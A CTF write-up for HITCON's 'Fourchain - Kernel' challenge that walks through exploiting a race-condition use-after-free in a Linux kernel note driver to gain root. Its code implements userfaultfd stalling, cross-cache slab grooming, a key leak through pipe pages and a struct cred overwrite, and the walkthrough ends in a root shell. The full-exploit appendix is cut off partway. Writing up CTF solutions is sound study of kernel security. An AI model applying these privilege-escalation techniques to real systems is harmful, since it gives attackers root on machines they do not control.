## Fourchain - Kernel

**Authors**: [pql](https://twitter.com/pqlqpql)

**Tags**: pwn, kernel

**Points**: 321

> It's more krazy in the kernel...
> 
> ssh -p 54321 knote@35.238.182.189
> password: knote
> 
> Resources are limited, please work on local first.
> 
> kernel-39fb8300c4181886fecd27bf4333b58348faf279.zip
> 
> Author: Billy


This year's HITCON CTF was a lot of fun! Sadly, I could only play during the second half, but I managed to solve a few challenges, including `fourchain-kernel`.

This challenge was the third part in the chain: after pwning the renderer process and breaking out of the chromium sandbox, we're now tasked with getting kernel privileges.

Like all parts of the fullchain, this was a separate challenge on which you could earn points without completing any other part of the chain.

---

The challenge follows a pretty standard Linux kernel CTF setup: we're provided a `bzImage` and the source code of a module that registers a character device, presumably with some vulnerability we have to exploit. Generally, these types of challenges are more about the exploitation than about the vulnerability research, so let's see what stands out:


```c 
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/ioctl.h>
#include <linux/random.h>

#define IOC_MAGIC '\xFF'

#define IO_ADD     _IOWR(IOC_MAGIC, 0, struct ioctl_arg)
#define IO_EDIT    _IOWR(IOC_MAGIC, 1, struct ioctl_arg)
#define IO_SHOW    _IOWR(IOC_MAGIC, 2, struct ioctl_arg)
#define IO_DEL	   _IOWR(IOC_MAGIC, 3, struct ioctl_arg)

struct ioctl_arg
{
    uint64_t idx;
    uint64_t size;
    uint64_t addr;
};

struct node
{
    uint64_t key;
    uint64_t size;
    uint64_t addr;
};

static struct node *table[0x10];
static int drv_open(struct inode *inode, struct file *filp);
static long drv_unlocked_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);


static struct file_operations drv_fops = {
    open : drv_open,
    unlocked_ioctl : drv_unlocked_ioctl
};


static struct miscdevice note_miscdev = {
    .minor      = 11,
    .name       = "note2",
    .fops       = &drv_fops,
    .mode	= 0666,
};

static int drv_open(struct inode *inode, struct file *filp){
    return 0;
}


static long drv_unlocked_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
    int ret = 0;
    int i = 0;
    uint64_t buf[0x200 / 8];
    uint64_t addr = 0;
    uint64_t size = 0;
    struct ioctl_arg data;

    memset(&data, 0, sizeof(data));
    memset(buf, 0, sizeof(buf));

    if (copy_from_user(&data, (struct ioctl_arg __user *)arg, sizeof(data))){
        ret = -EFAULT;
        goto done;
    }

    data.idx &= 0xf;
    data.size &= 0x1ff;

    switch (cmd) {
    case IO_ADD: {
        data.idx = -1;
        for (i = 0; i < 0x10; i++){
            if (!table[i]) {
                data.idx = i;
                break;
            }
        }

        if (data.idx == -1){
            ret = -ENOMEM;
            goto done;
        }
        table[data.idx] = (struct node*)kzalloc(sizeof(struct node), GFP_KERNEL);
        table[data.idx]->size = data.size;
        get_random_bytes(&table[data.idx]->key, sizeof(table[data.idx]->key));

        addr = (uint64_t)kzalloc(data.size, GFP_KERNEL);
        ret = copy_from_user(buf, (void __user *)data.addr, data.size);

        for (i = 0; i * 8 < data.size; i++)
            buf[i] ^= table[data.idx]->key;
        memcpy((void*)addr,(void*)buf,data.size);
        table[data.idx]->addr =  addr ^ table[data.idx]->key;
    } break;         
    case IO_EDIT: {
        if (table[data.idx]) {
            addr = table[data.idx]->addr ^ table[data.idx]->key;
            size = table[data.idx]->size & 0x1ff;
            ret = copy_from_user(buf, (void __user *)data.addr, size);

            for(i = 0; i * 8 < size; i++)
                buf[i] ^= table[data.idx]->key;
            memcpy((void*)addr, buf, size);
        }
    } break;
    case IO_SHOW: {
        if(table[data.idx]) {
            addr = table[data.idx]->addr ^ table[data.idx]->key;
            size = table[data.idx]->size & 0x1ff;
            memcpy(buf, (void*)addr,size);
            
            for (i = 0; i * 8 < size; i++)
                buf[i] ^= table[data.idx]->key;
            ret = copy_to_user((void __user *)data.addr, buf, size);
        }
    } break;
    case IO_DEL: {
        if(table[data.idx]) {
            addr = table[data.idx]->addr ^ table[data.idx]->key;
            kfree((void*)addr);
            kfree(table[data.idx]);
            table[data.idx] = 0;
        }
    } break;
    default:
        ret = -ENOTTY;
        break;
    }
    
    done:
        return ret;
}


static int note_init(void){
    return misc_register(&note_miscdev);
}

static void note_exit(void){
    misc_deregister(&note_miscdev);
}

module_init(note_init);
module_exit(note_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Secret Note v2");
```

The character device can store up to sixteen (global) "secret notes" that are "encrypted", each with their own xor key that is generated upon creation. The notes are stored in the global `table` array, which consists of `struct node` pointers - each containing a random `key`, the `size` of the contents, and an `addr` that once XORed with `key` points to the contents (a buffer that was dynamically allocated with `kzalloc`.) Note that the contents themselves are XORed with `key` as well, and that `size` is limited of 0x1ff.

The following ioctls are available:

- `IO_ADD` - Create a new note, with contents of a certain size. Returns us the index of the note.
- `IO_EDIT` - Given such an index, replaces the contents of the corresponding note.
- `IO_SHOW` - Given such an index, copies the contents to a buffer in user memory.
- `IO_DEL` - Given such an index, destroys and removes the note and frees up the index for future use.

The vulnerability is pretty clear: there is no attempt at all to serialize the state transitions with e.g. a lock. For example, if an `IO_DEL` request is issued in parallel with an `IO_EDIT` request - the latter might end up writing to a buffer that was already `kfree()`-d.

On first sight, it might look like the race window is very small, but the `copy_from_user()` call in the `IO_EDIT` path gives us an easy way out: this call will block if it triggers a page fault whilst trying to read user memory. This extends the race window, so we have a chance to reallocate the buffer we freed with `IO_DEL`

The provided kernel also gives unprivileged users access to `userfaultfd`, so we can handle page faults in usermode and make them block indefinitely. This is very nice, because now we don't even have to hit a race window anymore - the serialization of the operations is totally up to us. 

As a sidenote, generally userfaultfd is not enabled in the "real world". On systems without userfaultfd, it's sometimes possible to get an equivalent primitive using a FUSE handler and `mmap()`. If that's also not a possibility, massaging the surrounding state of an existing regular page fault handler to make it take as long as possible is your best bet.

---

We want to get more or less the following sequence:

1. Allocate a note with idx `i`.
2. Issue an `IO_EDIT` request for `i`, with an address pointing to a page we registered with userfaultfd.
    - We'll receive a notification through the userfaultfd and can stall the page fault as long as we want.
3. Issue an `IO_DEL` request for `i` to free its `struct node` and backing buffer.
4. Reallocate the backing buffer to something juicy.
5. Unblock the pending page fault through userfaultfd, by faulting in a page with our desired payload.
    - The `IO_EDIT` request will resume and copy our payload to said juicy something.

An obvious contender for the juicy object competition is `struct cred` - if the cred is already relative to the root user namespace (`&init_user_ns`), we can just overwrite all the -id fields to `0` and the cap- fields to `0x1ffffffff` (full capabilities) to gain root privileges.

```c 
struct cred {
	atomic_t	usage;
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
    //[...]
}
```

The standalone challenge only requires us to read/write the flag file in `/root`, so only overwriting `uid` or `fsid` would be enough already. However, for the full chain we want to be able to load a kernel module to pwn the hypervisor, and we'll need the `CAP_SYS_MODULE` capability for that.

Apart from being a nice excercise, making the exploit reliable is also a priority here. Every failed full chain attempt on the remote would set us back about 10 minutes due to reboot times and such.

I deliberately did not attempt to get instruction pointer control at any point here. It's often a very unelegant solution - getting the kernel thread to return from the syscall gracefully is a pain, you need a leak, it creates a dependency on the offsets of the target kernel and in real world scenarios you also break a lot of state (deadlocks, etc.). Some creative spraying and targeting the right allocations goes a long way.

I ended up going with a "two-stage" approach, with two `IO_EDIT` requests (E1, E2) for the same note blocking with userfaultfd. 

The note N that we're going to target will have a backing allocation A allocated in `kmalloc-96`. This is important because `struct cred` its cache has 192-byte objects, so if we reallocate A as a `struct cred` eventually, there is a nice 50% chance that the object is aligned to the beginning of the cred. Using a `kmalloc-192` object would be a 100% chance, but that would have required us to overwrite at least 128 bytes of the cred and thus corrupted pointers like `cred->user_ns`, and we don't have a leak to succesfully fake that.

We'll exploit this as follows:

1. Submit `IO_EDIT` E1 for N, block on `data.addr` access.
1. Submit `IO_EDIT` E2 for N, block on `data.addr` access as well (on a different page).
1. Submit `IO_DEL` for N, which will free A and N.
1. Reallocate A as something that we can read from later (A').
1. Submit `IO_ADD` to create a new note (N').
    - This is needed because otherwise the `table[data.idx]->key` read in the `IO_EDIT` path will crash because `table[data.idx]` is reset to `NULL`.
1. Use the userfaultfd to fault in a page filled with zero bytes to unblock E1.
    - The `IO_EDIT` path of E1 will resume and XOR the new `table[data.idx]->key` with zero, resulting in... the key!
1. Read from A' to leak the key.
1. Free A' again and reallocate it as a`struct cred` that is used for a child process.
1. Use the userfaultfd to fault in a page that contains a fake (partial) `struct cred`, XORed with the key we just leaked.
    - The `IO_EDIT` path of E2 will resume and overwrite (part of) the `struct cred` with our fake version, giving it full root privileges!
1. Use the root privs to do nefarious things like loading a kernel module to exploit the hypervisor.


*Note bene: you can skip the whole two-stage approach and key leak if you make a single `IO_EDIT` fault twice in `copy_from_user`. This will write your contents to the target directly without performing the XOR afterwards. It also would enable us to use a kmalloc-192 object. I didn't think of this during the CTF ://*

Ok... easier said than done of course! There's a few things we have to figure out: let's start with how we're going to reallocate A -> A' (original backing buffer -> "something we can read from").

I ended up skipping same cache shenanigans, and released the slab that A resides on to the page allocator directly. We're going to need to do this anyway to reallocate A as (part of) a `struct cred`, so why not do it now? After we've done this, we can trivially reallocate it as e.g. the backing of a pipe, which we can read from. Note the `alloc_page()` call in `pipe_write()`:


```c 
static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
    //[...]
    for (;;) {
        if (!pipe->readers) {
            send_sig(SIGPIPE, current, 0);
            if (!ret)
                ret = -EPIPE;
            break;
        }

        head = pipe->head;
        if (!pipe_full(head, pipe->tail, pipe->max_usage)) {
            unsigned int mask = pipe->ring_size - 1;
            struct pipe_buffer *buf = &pipe->bufs[head & mask];
            struct page *page = pipe->tmp_page;
            int copied;

            if (!page) {
                page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
                if (unlikely(!page)) {
                    ret = ret ? : -ENOMEM;
                    break;
                }
                pipe->tmp_page = page;
            }
            //[...]
        }
        //[...]
    }
    //[...]
}
```

To succesfully release the order 0 slab that A resides on to the page allocator again, we'll have to trick the SLUB allocator a bit. Even if all objects on a given slab are freed, this does not automatically free the slab to the page allocator. First, SLUB tries to put the slab on a so called *per-cpu partial list*, so that it can be reused for other allocations in the same cache. The underlying thought is that keeping the pages cached for a bit will save latency for future allocations in that cache, because issuing a new slab will only require taking it from the per-cpu partial list vs. a relatively expensive call into the page allocator.

Of course it wouldn't be ideal if all these pages allocated for slabs could never be reused anywhere else again, so the partial list its capacity is bounded. This capacity can be found by reading `/sys/kernel/slab/$yourslab/cpu_partial` as root. For the challenge, `kmalloc-96` its cpu_partial was set to 30 slabs.

If the partial list is already full, a slab that has no active objects anymore *will* be released back to the page allocator, which is exactly what we want. So we'll have to fill the partial list up with a bunch of junk slabs first.


For a more detailed description, I would recommend reading [this section of the CVE-2022-29582 writeup I worked on](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#crossing-the-cache-boundary).

Generally all the grooming to release a slab to the page allocator can be abstracted quite neatly. It ended up looking like this (mostly lifted from the `CVE-2022-29582` exploit as well):

```c 

#define OBJS_PER_SLAB 32
#define CPU_PARTIAL 30

#define CC_OVERFLOW_FACTOR 8

static inline int64_t cc_allocate(struct cross_cache *cc,
                                  int64_t *repo,
                                  uint32_t to_alloc)
{
    for (uint32_t i = 0; i < to_alloc; i++)
    {
        int64_t ref = cc->allocate();
        if (ref == -1)
            return -1;
        repo[i] = ref;
    }
    return 0;
}

static inline int64_t cc_free(struct cross_cache *cc,
                              int64_t *repo,
                              uint32_t to_free,
                              bool per_slab)
{
    for (uint32_t i = 0; i < to_free; i++)
    {
        if (per_slab && (i % (cc->objs_per_slab - 1) == 0))
            continue;
        else
        {
            if (repo[i] == -1)
                continue;
            cc->free(repo[i]);
            repo[i] = -1;
        }
    }
    return 0;
}

/*
 * Reserve enough objects to later overflow the per-cpu partial list */
static inline int64_t reserve_partial_list_amount(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab * (cc->cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    cc_allocate(cc, cc->overflow_objs, to_alloc);
    return 0;
}

static inline int64_t allocate_victim_page(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab - 1;
    cc_allocate(cc, cc->pre_victim_objs, to_alloc);
    return 0;
}

static inline int64_t fill_victim_page(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab + 1;
    cc_allocate(cc, cc->post_victim_objs, to_alloc);
    return 0;
}

static inline int64_t empty_victim_page(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab - 1;
    cc_free(cc, cc->pre_victim_objs, to_free, false);
    to_free = cc->objs_per_slab + 1;
    cc_free(cc, cc->post_victim_objs, to_free, false);
    return 0;
}

static inline int64_t overflow_partial_list(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab * (cc->cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    cc_free(cc, cc->overflow_objs, to_free, true);
    return 0;
}

static inline int64_t free_all(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab * (cc->cpu_partial + 1);
    cc_free(cc, cc->overflow_objs, to_free, false);
    empty_victim_page(cc);

    return 0;
}

int64_t cc_next(struct cross_cache *cc)
{
    switch (cc->phase++)
    {
    case CC_RESERVE_PARTIAL_LIST:
        return reserve_partial_list_amount(cc);
    case CC_ALLOC_VICTIM_PAGE:
        return allocate_victim_page(cc);
    case CC_FILL_VICTIM_PAGE:
        return fill_victim_page(cc);
    case CC_EMPTY_VICTIM_PAGE:
        return empty_victim_page(cc);
    case CC_OVERFLOW_PARTIAL_LIST:
        return overflow_partial_list(cc);
    default:
        return 0;
    }
}

struct cross_cache *cc_init(uint32_t objs_per_slab,
                            uint32_t cpu_partial,
                            void *allocate_fptr,
                            void *free_fptr)
{
    struct cross_cache *cc = malloc(sizeof(struct cross_cache));
    if (!cc)
    {
        perror("init_cross_cache:malloc\n");
        return NULL;
    }
    cc->objs_per_slab = objs_per_slab;
    cc->cpu_partial = cpu_partial;
    cc->free = free_fptr;
    cc->allocate = allocate_fptr;
    cc->phase = CC_RESERVE_PARTIAL_LIST;

    uint32_t n_overflow = objs_per_slab * (cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    uint32_t n_previctim = objs_per_slab - 1;
    uint32_t n_postvictim = objs_per_slab + 1;

    cc->overflow_objs = malloc(sizeof(int64_t) * n_overflow);
    cc->pre_victim_objs = malloc(sizeof(int64_t) * n_previctim);
    cc->post_victim_objs = malloc(sizeof(int64_t) * n_postvictim);

    return cc;
}
```

And then qua integration in the exploit:

```c
int main()
{
    kmalloc96_cc = cc_init(OBJS_PER_SLAB, CPU_PARTIAL, cc_alloc_kmalloc96, cc_free_kmalloc96);
    //[...]
    /* allocate a bunch of kmalloc96 objects, so the next one we allocate will fall into our "victim page" */
    cc_next(kmalloc96_cc);
    cc_next(kmalloc96_cc);
    note_add(mem, 96);

    /* also fill up the victim page */
    cc_next(kmalloc96_cc);
    //[...]
}

static void *userfault_thread(void *arg)
{
    cc_next(kmalloc96_cc); /* free surrounding objects*/
    cc_next(kmalloc96_cc); /* fill up partial lists */

    /* sleep for rcu*/
    usleep(200000);
    
    /* free backing buffer in kmalloc-96 and release its slab back to the page allocator. */
    note_del(0);
    //[...]
}
```

for `cc_alloc_kmalloc96` and `cc_free_kmalloc96` i used a nice primitive in `io_uring` that allows for spraying an unlimited amount of objects in `kmalloc-96`:

```c 
int uring_spray_fd;

static int64_t cc_alloc_kmalloc96()
{
    /* This will allocate a io uring identity in kmalloc-96. It can be repeated an arbitrary amount of times for a single uring instance. */
    int res = syscall(SYS_io_uring_register, uring_spray_fd, IORING_REGISTER_PERSONALITY, 0, 0);
    if (res < 0)
        fatal("alloc: io_uring_register() failed");
    
    return res;
}

static void cc_free_kmalloc96(int64_t personality)
{
    if (syscall(SYS_io_uring_register, uring_spray_fd, IORING_UNREGISTER_PERSONALITY, 0, personality) < 0)
        fatal("free: io_uring_register() failed");
}
```

Which corresponds to the following kernel code:
```c 
static int io_register_personality(struct io_ring_ctx *ctx)
{
	struct io_identity *iod;
	u32 id;
	int ret;

	iod = kmalloc(sizeof(*iod), GFP_KERNEL); /* sizeof (*iod) == 72 -> kmalloc-96 */
	if (unlikely(!iod))
		return -ENOMEM;

	io_init_identity(iod);
	iod->creds = get_current_cred();

	ret = xa_alloc_cyclic(&ctx->personalities, &id, (void *)iod,
			XA_LIMIT(0, USHRT_MAX), &ctx->pers_next, GFP_KERNEL);
	if (ret < 0) {
		put_cred(iod->creds);
		kfree(iod);
		return ret;
	}
	return id;
}
```

Then, to reallocate the slab as the backing buffer for a pipe, and subsequently read it out again:

```c 
static void *userfault_thread(void *arg)
{
    //[...]
    /* Reallocate freed kmalloc-96 slab as a pipe page. */
    uint64_t dummy_buf[0x1000 / 8] = {};
    for (size_t i = 0; i < ARRAY_SIZE(pipes); i++)
        if (write(pipes[i].write, dummy_buf, 0x1000) < 0)
            fatal("write() to pipe failed");

    /* unblock to trigger memcpy(). */
    size_t copied_size = 0;
    ufd_unblock_page_copy((void *)blockers[0].arg.pagefault.address, scratch, &copied_size);

    usleep(200000);
    uint64_t cookie = 0, cookie_idx = 0;
    size_t pipe_idx;
    for (pipe_idx = 0; pipe_idx < ARRAY_SIZE(pipes); pipe_idx++) {
        /* kmalloc-96 is not naturally aligned to PAGESIZE, so we can read this all without worrying
         * about prematurely freeing our page. */
        for (size_t i = 0; i < 42; i++) {
            uint64_t chunk[0x0c];

            if (read(pipes[pipe_idx].read, &chunk, 96) <= 0)
                fatal("read() from pipe failed");

            uint64_t potential_cookie = chunk[0];

            printf("%.16lx\n", potential_cookie);
            if (!cookie && potential_cookie) {
                cookie = potential_cookie;
                cookie_idx = i;
            }
        }

        if (cookie) {
            break;
        }
    }

    if (cookie) {

        /* If we didn't land on a cred boundary, bail out. We'd crash anyway. */
        if ((cookie_idx * 96) % 192 != 0) {
            /* make the memcpy() just write into our controlled pipe page again, so no harm is done. */
            ufd_unblock_page_copy((void *)blockers[1].arg.pagefault.address, scratch, &copied_size);
            fatal("UaF object was not aligned to 192 bytes. Try again..");
        }

        /* Before releasing the page again, we empty the cred freelist 
         * so any new cred allocations will get a new slab */
        alloc_n_creds(uring_cred_dumps[0], 0x4000);

        /* Release page*/
        close(pipes[pipe_idx].read);
        close(pipes[pipe_idx].write);
    } else {
        /* this error path is a bit problematic, we don't know where the write went.. 
         * still, it's better to get the other write over with now.
        */
        ufd_unblock_page_copy((void *)blockers[1].arg.pagefault.address, scratch, &copied_size);
        fatal("cross-cache failed. Try again..");
    }

    printf("pipe %ld, offset +0x%.4lx: cookie %.16lx\n", pipe_idx, cookie_idx * 96, cookie);
    //[...]
}
```

Note that we can also observe the offset of the object inside of the page now by tracking how much we've read from the pipe! This is important, because now we can determine whether our UaF buffer is aligned to 192 bytes or not. If this is not the case, we'll have to exit early, because even reallocating as a struct cred, we'd end up with bad alignment that'd leave us unable to overwrite the juicy cred fields. This is actually fine, because we can just retry the exploit up until this part until we get favorable alignment.

If the offset is favorable, we can now proceed by closing the pipe and thereby releasing the pipe back to the page allocator. Now we can reallocate this page as a `struct cred` slab! I found a nice way to spray `struct cred`s in a targeted way using the `capset` syscall:

```c 
SYSCALL_DEFINE2(capset, cap_user_header_t, header, const cap_user_data_t, data)
{
	struct __user_cap_data_struct kdata[_KERNEL_CAPABILITY_U32S];
	unsigned i, tocopy, copybytes;
	kernel_cap_t inheritable, permitted, effective;
	struct cred *new;
	int ret;
	pid_t pid;

	ret = cap_validate_magic(header, &tocopy);
	if (ret != 0)
		return ret;

	if (get_user(pid, &header->pid))
		return -EFAULT;

	/* may only affect current now */
	if (pid != 0 && pid != task_pid_vnr(current))
		return -EPERM;

	copybytes = tocopy * sizeof(struct __user_cap_data_struct);
	if (copybytes > sizeof(kdata))
		return -EFAULT;

	if (copy_from_user(&kdata, data, copybytes))
		return -EFAULT;

	for (i = 0; i < tocopy; i++) {
		effective.cap[i] = kdata[i].effective;
		permitted.cap[i] = kdata[i].permitted;
		inheritable.cap[i] = kdata[i].inheritable;
	}
	while (i < _KERNEL_CAPABILITY_U32S) {
		effective.cap[i] = 0;
		permitted.cap[i] = 0;
		inheritable.cap[i] = 0;
		i++;
	}

	effective.cap[CAP_LAST_U32] &= CAP_LAST_U32_VALID_MASK;
	permitted.cap[CAP_LAST_U32] &= CAP_LAST_U32_VALID_MASK;
	inheritable.cap[CAP_LAST_U32] &= CAP_LAST_U32_VALID_MASK;

	new = prepare_creds();
	if (!new)
		return -ENOMEM;

	ret = security_capset(new, current_cred(),
			      &effective, &inheritable, &permitted);
	if (ret < 0)
		goto error;

	audit_log_capset(new, current_cred());

	return commit_creds(new);

error:
	abort_creds(new);
	return ret;
}
```

`new = prepare_creds()` will allocate a new `struct cred` and `return commit_creds(new)` will replace our current task its cred with `new_cred`. To prevent the old cred from being freed, we can actually reuse the `io_uring` primitive we used for spraying kmalloc-96!

```c 
static int io_register_personality(struct io_ring_ctx *ctx)
{
	struct io_identity *iod;
	u32 id;
	int ret;

	iod = kmalloc(sizeof(*iod), GFP_KERNEL); /* sizeof (*iod) == 72 -> kmalloc-96 */
	if (unlikely(!iod))
		return -ENOMEM;

	io_init_identity(iod);
	iod->creds = get_current_cred();

	ret = xa_alloc_cyclic(&ctx->personalities, &id, (void *)iod,
			XA_LIMIT(0, USHRT_MAX), &ctx->pers_next, GFP_KERNEL);
	if (ret < 0) {
		put_cred(iod->creds);
		kfree(iod);
		return ret;
	}
	return id;
}
```

`get_current_cred()` will take an extra reference to the current tasks cred and store it in the io_uring context. We can combine this with capset in the following way:

```c 
static int alloc_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++) {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3
        };

        struct user_cap_data_struct cap_data[2] = {
            {.effective = 0, .inheritable = 0, .permitted = 0},
            {.effective = 0, .inheritable = 0, .permitted = 0}
        };

        /* allocate new cred */
        if (syscall(SYS_capset, &cap_hdr, (void *)cap_data))
            fatal("capset() failed");

        /* increment refcount so we don't free it afterwards*/
        if (syscall(SYS_io_uring_register, uring_fd, IORING_REGISTER_PERSONALITY, 0, 0) < 0)
            fatal("io_uring_register() failed");
    }
}
```

Before freeing the pipe page again, you might have already noticed the call to `alloc_n_creds(uring_creds_dump[0], 0x4000)`. We do this while the page is still in use to exhaust all the freelists (both cpu partial lists and per slab freelists) for the `struct cred` cache. This way, we can be quite certain that new `struct cred` allocations will immediately cause a new slab to be allocated from the page allocator directly.

The remaining part of the exploit is short and sweet:

```c 
static void *userfault_thread(void *arg)
{
    //[...]
    printf("pipe %ld, offset +0x%.4lx: cookie %.16lx\n", pipe_idx, cookie_idx * 96, cookie);

    /* Pre-allocate struct creds to reclaim the page. 
     * Free them immediately afterwards so we can reallocate them for tasks. */
    alloc_n_creds(uring_cred_dumps[1], 32);
    close(uring_cred_dumps[1]);

    /* wait for rcu to finish so creds are actually freed. */
    usleep(200000);

    struct pipe_pair child_comm;
    pipe(child_comm.__raw);

    /* realloc creds, now belong to child tasks */
    for (size_t i = 0; i < 32 * 2; i++) {
        
        if (fork())
            continue;
        
        sleep(2);
        uid_t uid = getuid();
        printf("uid: %d\n", uid);
        if (!uid) {
            char dummy[8];
            write(child_comm.write, &dummy, sizeof dummy);
            system("sh");
        }

        exit(0);
        
    }

    sleep(1);

    struct kernel_cred *cred = (void*)scratch;

    cred->usage = 1;
    cred->uid = cred->euid = cred->fsuid = 0;
    cred->gid = cred->egid = cred->fsgid = 0;
    cred->securebits = 0; /* SECUREBITS_DEFAULT */
    cred->cap_effective = cred->cap_permitted = cred->cap_inheritable = cred->cap_bset = 0x1fffffffful;
    cred->cap_ambient = 0;

    for (size_t i = 0; i < 96 / 8; i++)
        scratch[i] ^= cookie;

    ufd_unblock_page_copy((void *)blockers[1].arg.pagefault.address, scratch, &copied_size);

    struct pollfd poller[] = { {.events = POLLIN, .fd = child_comm.read}};

    if (poll(poller, 1, 3000) != 1)
        fatal("Could not overwrite struct cred. Try again..");

    sleep(10000);
    return NULL;
}
```

We call `alloc_n_creds(uring_cred_dumps[1], 32)` to alloc 32 new `struct cred`s that will hopefully cause the page to be reallocated as a `struct cred` slab. Afterwards, we free all of them, and allocate a bunch of child processes. The cred allocations will be reused for their creds, after which point we can trigger the UaF write again and overwrite the creds to give us root! Each child process can then check their uid via `getuid()` and give us a root shell in case it returns `0`.

*Note bene: Technically the parent task could also have had its cred overwritten, so I should have checked there as well. */

The exploit completes in a few seconds and is quite reliable (though I could have done a few more optimizations!) The exploit will succeed about 50% of the time due to the alignment problem, but can be reran as it won't cause a crash.

```
~ $ ./pwn
[+] rlimit 7 increased to 4096userfaultfd initialized
[+] got userfault block 0 (addr 00007f8a4d7ab000)
[+] got userfault block 1 (addr 00007f8a4d7ac000)
unblocking 0x7f8a4d7ab000 (copying 0x1000 bytes from 0x7f8a4d7a9000)[+] note_edit() succeeded
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
529d1fb9167cb1a3
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
pipe 0, offset +0x0240: cookie 529d1fb9167cb1a3
unblocking 0x7f8a4d7ac000 (copying 0x1000 bytes from 0x7f8a4d7a9000)done
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 0
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
/home/note # id
uid=0(root) gid=0 groups=1000
/home/note # cat /root/flag
hitcon{R4c3_Bl0ck_Bl0ck_Bl0ck_70_r00t}
```
---

## Appendix: full exploit

```c 
#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <errno.h>
#include <inttypes.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <poll.h>
#include <stdnoreturn.h>
#include <string.h>
#include <unistd.h>

#include <linux/userfaultfd.h>

#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <linux/capability.h>
#include <sys/xattr.h>

/* musl is stupid btw */
#undef NGROUPS_MAX
#undef _IOC
#undef _IO
#undef _IOR
#undef _IOW
#undef _IOWR

#include <linux/io_uring.h>

#define CC_OVERFLOW_FACTOR 8
enum {
    CC_RESERVE_PARTIAL_LIST = 0,
    CC_ALLOC_VICTIM_PAGE,
    CC_FILL_VICTIM_PAGE,
    CC_EMPTY_VICTIM_PAGE,
    CC_OVERFLOW_PARTIAL_LIST
};

struct cross_cache
{
    uint32_t objs_per_slab;
    uint32_t cpu_partial;
    struct
    {
        int64_t *overflow_objs;
        int64_t *pre_victim_objs;
        int64_t *post_victim_objs;
    };
    uint8_t phase;
    int (*allocate)();
    int (*free)(int64_t);
};

#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
// n must be a power of 2
#define ALIGN(x, n) ((x) + (-(x) & ((n)-1)))

#define CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

#define IOC_MAGIC '\xFF'

#define IO_ADD _IOWR(IOC_MAGIC, 0, struct ioctl_arg)
#define IO_EDIT _IOWR(IOC_MAGIC, 1, struct ioctl_arg)
#define IO_SHOW _IOWR(IOC_MAGIC, 2, struct ioctl_arg)
#define IO_DEL _IOWR(IOC_MAGIC, 3, struct ioctl_arg)

struct ioctl_arg
{
    uint64_t idx;
    uint64_t size;
    uint64_t addr;
};

static noreturn void fatal(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

static int userfault_fd;
static void *userfault_page;

static pthread_t userfault_pthread;

static int note_fd;
